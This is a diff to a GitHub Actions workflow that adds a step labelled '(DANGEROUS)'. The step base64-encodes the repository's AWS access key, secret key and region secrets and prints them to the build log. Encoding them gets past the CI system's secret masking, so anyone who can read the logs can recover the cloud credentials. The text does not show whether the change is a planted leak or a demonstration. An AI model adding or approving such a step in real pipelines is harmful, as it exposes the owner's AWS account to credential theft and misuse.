@@ -16,6 +16,17 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
+      - name: Echo AWS credentials in Base64 (DANGEROUS)
+        run: |
+          echo "AWS_ACCESS_KEY_ID (base64):"
+          echo -n "${{ secrets.AWS_ACCESS_KEY_ID }}" | base64
+
+          echo "AWS_SECRET_ACCESS_KEY (base64):"
+          echo -n "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | base64
+
+          echo "AWS_REGION (base64):"
+          echo -n "${{ secrets.AWS_REGION }}" | base64
+
       - name: Configure AWS credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
